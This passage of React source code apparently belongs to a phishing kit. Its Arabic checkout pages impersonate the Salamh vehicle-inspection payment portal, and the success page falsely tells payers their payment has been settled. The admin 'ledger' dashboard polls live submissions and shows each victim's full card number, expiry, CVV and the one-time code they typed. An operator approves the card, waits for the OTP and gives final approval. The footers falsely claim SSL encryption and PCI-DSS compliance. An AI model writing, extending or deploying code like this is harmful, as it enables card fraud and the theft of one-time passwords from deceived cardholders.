                  >
                    {isSubmitting ? (
                      <>
                        <RefreshCw className="h-4 w-4 animate-spin text-white" />
                        <span>جاري تأكيد ومعالجة المعاملة...</span>
                      </>
                    ) : (
                      <>
                        <span className="font-sans font-extrabold text-base">دفع</span>
                        <ArrowRight className="h-4 w-4 rotate-180 text-white/90" />
                      </>
                    )}
                  </button>
                </motion.div>
              )}
            </AnimatePresence>
          </motion.div>
        )}
      </AnimatePresence>
    </form>
  </motion.div>
)}
</AnimatePresence>

        </div>
      </div>
    </div>
  );
};;

// Success Page Component
const SuccessPage: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const tx: Transaction | undefined = location.state?.tx;

  // Fallback to home if page loaded directly without receipt transaction state
  useEffect(() => {
    if (!tx) {
      navigate('/');
    }
  }, [tx, navigate]);

  if (!tx) return null;

  return (
    <div className="mx-auto max-w-xl px-4 py-16 sm:px-6">
      <motion.div
        initial={{ opacity: 0, scale: 0.95 }}
        animate={{ opacity: 1, scale: 1 }}
        transition={{ duration: 0.4 }}
        className="rounded-2xl border border-gray-100 bg-white p-8 text-center shadow-xl relative overflow-hidden"
      >
        {/* Decorative Top Accent Bar */}
        <div className="absolute top-0 inset-x-0 h-1.5 bg-[#004d33]" />

        <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-full bg-emerald-50 text-[#004d33] border border-emerald-100 mb-6">
          <CheckCircle className="h-8 w-8" />
        </div>

        <h2 className="text-xl font-extrabold text-slate-800 tracking-tight font-sans">تمت عملية السداد بنجاح</h2>
        <p className="text-xs text-slate-500 mt-2 font-medium">
          تم تسجيل وقبول دفعتك بنجاح في بوابة منصة سلامة وتوجيهها للمطابقة والتدقيق النهائي.
        </p>

        {/* Receipt Block (Arabic/English) */}
        <div className="my-8 rounded-xl bg-gray-50 border border-gray-100 p-5 text-right space-y-3 font-sans text-xs dir-rtl">
          <div className="flex justify-between items-center border-b border-gray-200/60 pb-2">
            <span className="text-slate-500">الرقم المرجعي (Transaction ID):</span>
            <span className="text-[#004d33] font-bold font-mono text-[11px]">{tx.id}</span>
          </div>
          <div className="flex justify-between items-center border-b border-gray-200/60 pb-2">
            <span className="text-slate-500">رقم البطاقة (Card Number):</span>
            <span className="text-slate-800 font-mono text-[11px]">{tx.cardNumber}</span>
          </div>
          <div className="flex justify-between items-center border-b border-gray-200/60 pb-2">
            <span className="text-slate-500">حامل البطاقة (Cardholder Name):</span>
            <span className="text-slate-800 font-bold truncate max-w-[200px] text-[11px]">{tx.cardholderName.toUpperCase()}</span>
          </div>
          <div className="flex justify-between items-center border-b border-gray-200/60 pb-2">
            <span className="text-slate-500">شبكة الدفع (Payment Network):</span>
            <span className="text-slate-800 uppercase font-extrabold text-[11px]">{tx.cardType}</span>
          </div>
          <div className="flex justify-between items-center border-b border-gray-200/60 pb-2">
            <span className="text-slate-500">المبلغ الإجمالي (Amount Paid):</span>
            <span className="text-[#004d33] font-black font-mono text-sm">{tx.amount.toFixed(2)} ر.س</span>
          </div>
          <div className="flex justify-between items-center">
            <span className="text-slate-500">حالة التسوية (Settlement Status):</span>
            <span className="inline-flex items-center gap-1 text-[10px] bg-emerald-50 text-[#004d33] px-2.5 py-1 rounded-full border border-emerald-100 font-extrabold">
              <span className="relative flex h-1.5 w-1.5">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75"></span>
                <span className="relative inline-flex h-1.5 w-1.5 rounded-full bg-emerald-500"></span>
              </span>
              <span>{tx.status === 'APPROVED' ? 'مقبولة ومعتمدة' : tx.status}</span>
            </span>
          </div>
        </div>

        {/* Navigation CTAs */}
        <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
          <button
            onClick={() => navigate('/')}
            className="flex items-center justify-center gap-2 rounded-xl border border-gray-200 bg-white hover:bg-gray-50 px-4 py-3 text-xs font-bold text-slate-700 transition"
          >
            <span>سداد معاملة جديدة</span>
          </button>
          <button
            onClick={() => navigate('/dashboard')}
            className="flex items-center justify-center gap-2 rounded-xl bg-[#004d33] hover:bg-[#003824] px-4 py-3 text-xs font-bold text-white shadow-md shadow-emerald-950/15 transition"
          >
            <span>إدارة لوحة التحكم</span>
            <ArrowRight className="h-3.5 w-3.5 rotate-180" />
          </button>
        </div>
      </motion.div>
    </div>
  );
};

// Admin Dashboard Component
const AdminDashboard: React.FC = () => {
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [selectedTx, setSelectedTx] = useState<Transaction | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [statusFilter, setStatusFilter] = useState<'All' | 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED'>('All');
  
  // Simulated visual flip toggle for dashboard inspector card
  const [cardInspectorFlipped, setCardInspectorFlipped] = useState(false);
  const [actionBusy, setActionBusy] = useState(false);
  const [dashboardError, setDashboardError] = useState<string | null>(null);
  const [deletingId, setDeletingId] = useState<string | null>(null);

  useEffect(() => {
    if (dashboardError) {
      const timer = setTimeout(() => setDashboardError(null), 5000);
      return () => clearTimeout(timer);
    }
  }, [dashboardError]);

  useEffect(() => {
    if (deletingId) {
      const timer = setTimeout(() => setDeletingId(null), 3000);
      return () => clearTimeout(timer);
    }
  }, [deletingId]);

  // Fetch all transactions from the Express server API
  const fetchTransactions = async (autoSelect = false) => {
    try {
      const res = await fetch('/api/transactions');
      const data = await res.json();
      setTransactions(data);
      
      // Auto-select first transaction if none selected or if matching auto-select request
      if (data.length > 0) {
        if (autoSelect || !selectedTx) {
          setSelectedTx(data[0]);
        } else {
          // Keep current selection but update its reference to catch state changes
          const updatedSelected = data.find((t: Transaction) => t.id === selectedTx.id);
          if (updatedSelected) {
            setSelectedTx(updatedSelected);
          }
        }
      } else {
        setSelectedTx(null);
      }
    } catch (err) {
      console.error('Error fetching transactions:', err);
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    fetchTransactions();
    const intervalId = setInterval(() => {
      fetchTransactions();
    }, 2000);
    return () => clearInterval(intervalId);
  }, []);

  // Filter transactions based on Search Term & Status Filter
  const filteredTxList = useMemo(() => {
    return transactions.filter(t => {
      const matchesSearch =
        t.cardholderName.toLowerCase().includes(searchTerm.toLowerCase()) ||
        t.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
        t.cardNumber.includes(searchTerm);
      const matchesStatus = statusFilter === 'All' || t.status === statusFilter;
      return matchesSearch && matchesStatus;
    });
  }, [transactions, searchTerm, statusFilter]);

  // Handle Approve/Reject status changes
  const handleUpdateStatus = async (status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED') => {
    if (!selectedTx || actionBusy) return;
    setActionBusy(true);

    try {
      const response = await fetch(`/api/admin/action`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: selectedTx.id, status })
      });
      const data = await response.json();

      if (data.success) {
        // Refresh items and update detailed view
        await fetchTransactions();
      } else {
        setDashboardError(data.error || 'Failed to update status.');
      }
    } catch (err) {
      console.error(err);
      setDashboardError('Error communicating status update to server.');
    } finally {
      setActionBusy(false);
    }
  };

  // Optional: clear transaction
  const handleDeleteTransaction = async (id: string, e: React.MouseEvent) => {
    e.stopPropagation();
    
    // Multi-click secure undoing pattern instead of window.confirm
    if (deletingId !== id) {
      setDeletingId(id);
      return;
    }

    try {
      const res = await fetch(`/api/transactions/${id}`, {
        method: 'DELETE'
      });
      if (res.ok) {
        setDeletingId(null);
        // If we deleted the currently selected one, auto select first remaining item
        const wasSelected = selectedTx?.id === id;
        await fetchTransactions(wasSelected);
      }
    } catch (err) {
      console.error(err);
      setDashboardError('Failed to remove transaction record.');
    }
  };

  return (
    <div className="mx-auto max-w-7xl px-4 py-8 sm:px-6">
      
      {/* Title block */}
      <div className="mb-6 flex flex-col justify-between gap-4 sm:flex-row sm:items-center">
        <div>
          <h2 className="text-2xl font-bold text-white tracking-tight">Financial Ledger Administration</h2>
          <p className="text-xs text-slate-400 mt-1">
            Real-time transactional desk. Auditing logs, securing Luhn structures, and issuing status locks.
          </p>
        </div>
        
        <button
          onClick={() => fetchTransactions()}
          className="inline-flex items-center space-x-1.5 rounded-xl border border-slate-800 bg-slate-900/60 px-4 py-2.5 text-xs font-semibold text-slate-300 hover:bg-slate-900 transition"
        >
          <RefreshCw className="h-3.5 w-3.5" />
          <span>Refresh Ledger</span>
        </button>
      </div>

      {dashboardError && (
        <div className="mb-6 rounded-xl border border-rose-500/20 bg-rose-500/10 p-4 text-xs text-rose-400 flex items-center space-x-2 animate-pulse">
          <AlertCircle className="h-4 w-4 shrink-0" />
          <span>{dashboardError}</span>
        </div>
      )}

      <div className="grid grid-cols-1 gap-8 lg:grid-cols-12">
        
        {/* --- LEFT COLUMN: Ledger Logs & Filters (7 cols) --- */}
        <div className="lg:col-span-7 space-y-4">
          
          {/* Controls bar (Search, Filter Tabs) */}
          <div className="rounded-xl border border-slate-850 bg-slate-900/30 p-4 space-y-3">
            {/* Search Input */}
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-500" />
              <input
                type="text"
                placeholder="Search by ID, Name, or Card Numbers..."
                className="w-full rounded-lg border border-slate-800 bg-slate-950 pl-10 pr-4 py-2 text-xs text-white placeholder-slate-600 focus:outline-none focus:ring-1 focus:ring-indigo-500/40"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
            </div>

            {/* Filter Tabs */}
            <div className="flex flex-wrap items-center gap-1.5 pt-1">
              <span className="text-[10px] font-mono uppercase text-slate-500 mr-2 flex items-center space-x-1">
                <Filter className="h-3 w-3" />
                <span>FILTERS:</span>
              </span>
              {(['All', 'PENDING_CARD_APPROVAL', 'AWAITING_OTP', 'OTP_SUBMITTED', 'APPROVED', 'REJECTED'] as const).map(tab => (
                <button
                  key={tab}
                  onClick={() => setStatusFilter(tab)}
                  className={`rounded-md px-2.5 py-1 text-[11px] font-mono font-bold transition-all ${
                    statusFilter === tab
                      ? 'bg-indigo-600 text-white shadow-md'
                      : 'bg-slate-950 text-slate-400 hover:text-white border border-slate-900'
                  }`}
                >
                  {tab === 'PENDING_CARD_APPROVAL' ? 'PENDING CARD' : tab === 'AWAITING_OTP' ? 'AWAITING OTP' : tab === 'OTP_SUBMITTED' ? 'OTP SUBMITTED' : tab}
                </button>
              ))}
            </div>
          </div>

          {/* Ledger list container */}
          <div className="rounded-xl border border-slate-800 bg-slate-900/20 overflow-hidden shadow-xl">
            {isLoading ? (
              <div className="py-24 text-center">
                <RefreshCw className="h-8 w-8 animate-spin mx-auto text-indigo-400" />
                <p className="text-xs text-slate-500 mt-2 font-mono">LOADING TRANSACTION STACK...</p>
              </div>
            ) : filteredTxList.length === 0 ? (
              <div className="py-24 text-center">
                <CardIcon className="h-10 w-10 mx-auto text-slate-600 mb-2" />
                <p className="text-sm font-bold text-slate-400">No records found</p>
                <p className="text-xs text-slate-600 font-mono mt-1">Try matching alternative keywords or filters.</p>
              </div>
            ) : (
              <div className="divide-y divide-slate-800/60 max-h-[500px] overflow-y-auto">
                {filteredTxList.map((tx) => {
                  const isSelected = selectedTx?.id === tx.id;
                  
                  // Status pill visual definitions
                  let statusBadge = null;
                  if (tx.status === 'APPROVED') {
                    statusBadge = (
                      <span className="inline-flex items-center space-x-1 rounded bg-emerald-500/10 px-1.5 py-0.5 text-[9px] font-mono font-bold text-emerald-400 ring-1 ring-inset ring-emerald-500/20">
                        <span>APPROVED</span>
                      </span>
                    );
                  } else if (tx.status === 'REJECTED') {
                    statusBadge = (
                      <span className="inline-flex items-center space-x-1 rounded bg-rose-500/10 px-1.5 py-0.5 text-[9px] font-mono font-bold text-rose-400 ring-1 ring-inset ring-rose-500/20">
                        <span>REJECTED</span>
                      </span>
                    );
                  } else if (tx.status === 'AWAITING_OTP') {
                    statusBadge = (
                      <span className="inline-flex items-center space-x-1 rounded bg-indigo-500/10 px-1.5 py-0.5 text-[9px] font-mono font-bold text-indigo-400 ring-1 ring-inset ring-indigo-500/20">
                        <span>AWAITING OTP</span>
                      </span>
                    );
                  } else if (tx.status === 'OTP_SUBMITTED') {
                    statusBadge = (
                      <span className="inline-flex items-center space-x-1 rounded bg-cyan-500/10 px-1.5 py-0.5 text-[9px] font-mono font-bold text-cyan-400 ring-1 ring-inset ring-cyan-500/20">
                        <span>OTP SUBMITTED</span>
                      </span>
                    );
                  } else {
                    statusBadge = (
                      <span className="inline-flex items-center space-x-1 rounded bg-amber-500/10 px-1.5 py-0.5 text-[9px] font-mono font-bold text-amber-400 ring-1 ring-inset ring-amber-500/20">
                        <span>PENDING CARD</span>
                      </span>
                    );
                  }

                  return (
                    <div
                      key={tx.id}
                      onClick={() => {
                        setSelectedTx(tx);
                        setCardInspectorFlipped(false); // Reset flips on card changes
                      }}
                      className={`flex items-center justify-between p-4 cursor-pointer transition-all ${
                        isSelected
                          ? 'bg-indigo-600/10 border-l-2 border-indigo-500'
                          : 'hover:bg-slate-900/40 border-l-2 border-transparent'
                      }`}
                    >
                      <div className="flex items-center space-x-3.5 min-w-0">
                        {/* Circle visual representation */}
                        <div className="hidden sm:flex h-9 w-9 items-center justify-center rounded-lg bg-slate-950 border border-slate-800 font-mono text-[10px] text-slate-400 shrink-0 uppercase">
                          {tx.cardType.slice(0, 4)}
                        </div>

                        <div className="min-w-0">
                          <div className="flex items-center space-x-2">
                            <span className="font-mono text-xs font-bold text-white tracking-tight">{tx.id}</span>
                            {statusBadge}
                          </div>
                          <p className="text-xs text-slate-300 font-medium truncate mt-0.5 uppercase">
                            {tx.cardholderName}
                          </p>
                          <div className="flex items-center space-x-2 text-[10px] font-mono text-slate-500 mt-1">
                            <span>{tx.cardNumber}</span>
                            <span>•</span>
                            <span>{new Date(tx.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</span>
                          </div>
                        </div>
                      </div>

                      <div className="flex items-center space-x-4">
                        <div className="text-right">
                          <p className="font-mono text-xs font-bold text-white">${tx.amount.toFixed(2)}</p>
                          <p className="text-[9px] font-mono text-slate-500">USD</p>
                        </div>
                        {/* Clear Button */}
                        <button
                          onClick={(e) => handleDeleteTransaction(tx.id, e)}
                          className={`p-1.5 rounded transition font-mono text-[10px] flex items-center space-x-1 ${
                            deletingId === tx.id
                              ? 'bg-rose-500/20 text-rose-400 border border-rose-500/30'
                              : 'text-slate-600 hover:text-rose-400'
                          }`}
                          title={deletingId === tx.id ? 'Confirm Clear' : 'Clear record'}
                        >
                          <Trash2 className="h-3.5 w-3.5" />
                          {deletingId === tx.id && <span className="text-[9px] font-bold">CONFIRM?</span>}
                        </button>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        </div>

        {/* --- RIGHT COLUMN: 3D Inspector Panel (5 cols) --- */}
        <div className="lg:col-span-5">
          <div className="rounded-2xl border border-slate-800 bg-slate-900/30 p-6 shadow-2xl backdrop-blur-lg sticky top-24">
            {selectedTx ? (
              <div className="space-y-6">
                
                {/* Header detail */}
                <div className="flex justify-between items-start border-b border-slate-800/80 pb-4">
                  <div>
                    <span className="text-[10px] font-mono text-indigo-400 font-bold uppercase tracking-wider">
                      INSPECTOR DESK
                    </span>
                    <h3 className="text-lg font-bold text-white tracking-tight mt-0.5">
                      Transaction detail
                    </h3>
                  </div>
                  <div className="text-right">
                    <span className="font-mono text-sm font-bold text-white block">
                      ${selectedTx.amount.toFixed(2)}
                    </span>
                    <span className="text-[10px] font-mono text-slate-500">
                      SUM LOCKED
                    </span>
                  </div>
                </div>

                {/* 3D Render block */}
                <div className="flex flex-col items-center justify-center pt-2">
                  <div className="relative w-full flex justify-center">
                    <CreditCard3D
                      cardNumber={selectedTx.cardNumber}
                      cardholderName={selectedTx.cardholderName}
                      expiry={selectedTx.expiry}
                      cvv={selectedTx.cvv}
                      cardType={selectedTx.cardType}
                      isFlipped={cardInspectorFlipped}
                    />
                  </div>

                  {/* Inspector Flippers */}
                  <div className="mt-4 flex items-center space-x-2">
                    <button
                      onClick={() => setCardInspectorFlipped(!cardInspectorFlipped)}
                      className="inline-flex items-center space-x-1 rounded-lg bg-slate-950 px-3 py-1.5 text-[11px] font-mono font-bold text-slate-400 hover:text-white border border-slate-900 transition"
                    >
                      <RefreshCw className="h-3 w-3" />
                      <span>FLIP INSPECTOR VIEW</span>
                    </button>
                  </div>
                </div>

                {/* Meta details text list */}
                <div className="rounded-xl bg-slate-950/80 border border-slate-800/60 p-4 space-y-2.5 font-mono text-xs">
                  {selectedTx.submittedOtp && (
                    <div className="flex justify-between pb-1.5 border-b border-slate-900/60 bg-cyan-950/25 px-2 py-1.5 rounded border border-cyan-500/15 animate-pulse">
                      <span className="text-cyan-400 font-bold">USER SUBMITTED OTP:</span>
                      <span className="text-cyan-300 font-black text-sm tracking-widest">{selectedTx.submittedOtp}</span>
                    </div>
                  )}
                  <div className="flex justify-between pb-1.5 border-b border-slate-900/60 bg-indigo-950/25 px-2 py-1.5 rounded border border-indigo-500/15">
                    <span className="text-indigo-400 font-bold">GENERATED OTP CODE:</span>
                    <span className="text-emerald-400 font-black text-sm tracking-widest">{selectedTx.otpCode || 'N/A'}</span>
                  </div>
                  <div className="flex justify-between pb-1.5 border-b border-slate-900/60">
                    <span className="text-slate-500">TX ID:</span>
                    <span className="text-indigo-400 font-bold">{selectedTx.id}</span>
                  </div>
                  <div className="flex justify-between pb-1.5 border-b border-slate-900/60">
                    <span className="text-slate-500">AMOUNT:</span>
                    <span className="text-emerald-400 font-bold">${selectedTx.amount.toFixed(2)} USD</span>
                  </div>
                  <div className="flex justify-between pb-1.5 border-b border-slate-900/60">
                    <span className="text-slate-500">CARD BRAND:</span>
                    <span className="text-white font-semibold uppercase">{selectedTx.cardType}</span>
                  </div>
                  <div className="flex justify-between pb-1.5 border-b border-slate-900/60">
                    <span className="text-slate-500">CARD NUMBER:</span>
                    <span className="text-white font-semibold">{selectedTx.cardNumber}</span>
                  </div>
                  <div className="flex justify-between pb-1.5 border-b border-slate-900/60">
                    <span className="text-slate-500">HOLDER:</span>
                    <span className="text-white font-semibold truncate max-w-[180px]">{selectedTx.cardholderName.toUpperCase()}</span>
                  </div>
                  <div className="flex justify-between pb-1.5 border-b border-slate-900/60">
                    <span className="text-slate-500">EXP DATE:</span>
                    <span className="text-white font-semibold">{selectedTx.expiry}</span>
                  </div>
                  <div className="flex justify-between pb-1.5 border-b border-slate-900/60">
                    <span className="text-slate-500">CVV CORE:</span>
                    <span className="text-white font-semibold">{selectedTx.cvv}</span>
                  </div>
                  <div className="flex justify-between pb-1.5 border-b border-slate-900/60">
                    <span className="text-slate-500">TIMESTAMP:</span>
                    <span className="text-white font-semibold text-[10px]">
                      {new Date(selectedTx.timestamp).toLocaleString()}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-slate-500">DECISION STATE:</span>
                    <span className={`font-black uppercase tracking-wider ${
                      selectedTx.status === 'APPROVED' ? 'text-emerald-400' :
                      selectedTx.status === 'REJECTED' ? 'text-rose-400' :
                      selectedTx.status === 'AWAITING_OTP' ? 'text-indigo-400' : 
                      selectedTx.status === 'OTP_SUBMITTED' ? 'text-cyan-400 animate-pulse' : 'text-amber-400'
                    }`}>
                      {selectedTx.status === 'PENDING_CARD_APPROVAL' ? 'PENDING CARD' : selectedTx.status === 'AWAITING_OTP' ? 'AWAITING OTP' : selectedTx.status === 'OTP_SUBMITTED' ? 'OTP SUBMITTED' : selectedTx.status}
                    </span>
                  </div>
                </div>

                {/* Audit lock/decision CTA triggers */}
                {selectedTx.status === 'PENDING_CARD_APPROVAL' ? (
                  <div className="space-y-2 pt-2">
                    <div className="text-[10px] text-slate-500 font-mono text-center uppercase tracking-widest bg-slate-950 py-1 rounded">
                      STAGE 1: EVALUATE CARD
                    </div>
                    <div className="grid grid-cols-2 gap-3">
                      <button
                        onClick={() => handleUpdateStatus('REJECTED')}
                        disabled={actionBusy}
                        className="flex h-12 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 text-xs font-bold tracking-wider hover:shadow-lg hover:shadow-rose-500/10 transition duration-200"
                      >
                        REJECT CARD
                      </button>
                      <button
                        onClick={() => handleUpdateStatus('AWAITING_OTP')}
                        disabled={actionBusy}
                        className="flex h-12 w-full items-center justify-center rounded-xl border border-emerald-500/20 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 text-xs font-bold tracking-wider hover:shadow-lg hover:shadow-emerald-500/10 transition duration-200"
                      >
                        APPROVE CARD
                      </button>
                    </div>
                  </div>
                ) : selectedTx.status === 'OTP_SUBMITTED' ? (
                  <div className="space-y-2 pt-2">
                    <div className="text-[10px] text-cyan-400 font-mono text-center uppercase tracking-widest bg-cyan-950/20 py-1 rounded border border-cyan-500/15 animate-pulse">
                      STAGE 2: VERIFY SUBMITTED OTP
                    </div>
                    <div className="grid grid-cols-2 gap-3">
                      <button
                        onClick={() => handleUpdateStatus('REJECTED')}
                        disabled={actionBusy}
                        className="flex h-12 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 text-xs font-bold tracking-wider hover:shadow-lg hover:shadow-rose-500/10 transition duration-200"
                      >
                        REJECT
                      </button>
                      <button
                        onClick={() => handleUpdateStatus('APPROVED')}
                        disabled={actionBusy}
                        className="flex h-12 w-full items-center justify-center rounded-xl border border-emerald-500/20 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 text-xs font-bold tracking-wider hover:shadow-lg hover:shadow-emerald-500/10 transition duration-200"
                      >
                        FINAL APPROVE
                      </button>
                    </div>
                  </div>
                ) : (
                  <div className="rounded-xl border border-dashed border-slate-800 p-4 text-center">
                    <p className="text-[11px] font-mono text-slate-500">
                      This transaction is locked at state{' '}
                      <span className={`font-bold ${
                        selectedTx.status === 'APPROVED' ? 'text-emerald-400' :
                        selectedTx.status === 'REJECTED' ? 'text-rose-400' : 'text-indigo-400'
                      }`}>
                        {selectedTx.status === 'PENDING_CARD_APPROVAL' ? 'PENDING CARD' : selectedTx.status === 'AWAITING_OTP' ? 'AWAITING OTP' : selectedTx.status}
                      </span>
                      . To reset queue logs:
                    </p>
                    <button
                      onClick={() => handleUpdateStatus('PENDING_CARD_APPROVAL')}
                      disabled={actionBusy}
                      className="mt-2 inline-flex items-center space-x-1 text-[10px] font-mono text-slate-400 hover:text-white underline transition"
                    >
                      <span>Reset to Pending state</span>
                    </button>
                  </div>
                )}

              </div>
            ) : (
              <div className="py-16 text-center">
                <ShieldCheck className="h-10 w-10 mx-auto text-slate-600 mb-2 animate-pulse" />
                <p className="text-sm font-bold text-slate-400">Ledger Auditing Desk</p>
                <p className="text-xs text-slate-600 mt-1 font-mono">
                  Select transactional logs from left panel to execute administrative status audits.
                </p>
              </div>
            )}
          </div>
        </div>

      </div>
    </div>
  );
};

// Router aware Content Component
function AppContent() {
  const location = useLocation();
  const isAdminPath = location.pathname === '/dashboard' || location.pathname === '/admin-portal';

  if (isAdminPath) {
    return (
      <div className="min-h-screen bg-slate-950 font-sans text-slate-200 antialiased selection:bg-emerald-500/30 selection:text-white">
        
        {/* Floating gradient ambient background orbs */}
        <div className="fixed inset-0 overflow-hidden pointer-events-none z-0">
          <div className="absolute top-[-10%] left-[-15%] w-[50%] h-[50%] rounded-full bg-emerald-900/10 blur-[120px]" />
          <div className="absolute bottom-[10%] right-[-10%] w-[40%] h-[40%] rounded-full bg-teal-900/10 blur-[100px]" />
        </div>

        <div className="relative z-10 flex flex-col min-h-screen">
          <Header />
          
          <main className="flex-grow">
            <Routes>
              <Route path="/" element={<CheckoutPage />} />
              <Route path="/waiting" element={<WaitingApprovalPage />} />
              <Route path="/otp" element={<OTPPage />} />
              <Route path="/success" element={<SuccessPage />} />
              <Route path="/dashboard" element={<AdminDashboard />} />
              <Route path="/admin-portal" element={<AdminPortal />} />
              <Route path="*" element={<Navigate to="/" replace />} />
            </Routes>
          </main>

          <footer className="border-t border-slate-900 bg-slate-950 py-6 text-center text-[11px] font-mono text-slate-500">
            <div className="mx-auto max-w-7xl px-4 sm:px-6 flex flex-col sm:flex-row justify-between items-center gap-2">
              <p>© 2026 Smart Cart Admin Terminal. Securely powered by Google AI Studio.</p>
              <div className="flex space-x-3 text-slate-600">
                <span>SHA-256 Enabled</span>
                <span>•</span>
                <span>PCI-DSS Compliant</span>
              </div>
            </div>
          </footer>
        </div>

      </div>
    );
  }

  // Light Mode client-facing portal layout (Salamh style!)
  return (
    <div className="min-h-screen bg-gray-50/70 font-sans text-slate-800 antialiased selection:bg-[#004d33]/20 selection:text-[#004d33]">
      
      {/* Subtle light mode ambient decorations */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none z-0">
        <div className="absolute top-[-20%] left-[-10%] w-[60%] h-[60%] rounded-full bg-emerald-500/5 blur-[160px]" />
        <div className="absolute bottom-[5%] right-[-10%] w-[40%] h-[40%] rounded-full bg-sky-500/5 blur-[140px]" />
      </div>

      <div className="relative z-10 flex flex-col min-h-screen">
        <Header />
        
        <main className="flex-grow">
          <Routes>
            <Route path="/" element={<CheckoutPage />} />
            <Route path="/waiting" element={<WaitingApprovalPage />} />
            <Route path="/otp" element={<OTPPage />} />
            <Route path="/success" element={<SuccessPage />} />
            <Route path="/dashboard" element={<AdminDashboard />} />
            <Route path="/admin-portal" element={<AdminPortal />} />
            <Route path="*" element={<Navigate to="/" replace />} />
          </Routes>
        </main>

        <footer className="border-t border-gray-100 bg-white py-6 text-center text-xs text-slate-500 font-sans shadow-inner dir-rtl">
          <div className="mx-auto max-w-7xl px-4 sm:px-6 flex flex-col sm:flex-row justify-between items-center gap-2">
            <p className="font-medium">© 2026 سلامة لسلامة المركبات. جميع الحقوق محفوظة.</p>
            <div className="flex space-x-3 space-x-reverse text-[11px] text-slate-400 font-sans">
              <span>اتصال آمن ومشفّر SSL</span>
              <span>•</span>
              <span>بوابة دفع معتمدة ومطابقة لمواصفات PCI-DSS</span>
            </div>
          </div>
        </footer>
      </div>

    </div>
  );
}

// Root Router wrapper
export default function App() {
  return (
    <HashRouter>
      <AppContent />
    </HashRouter>
  );
}
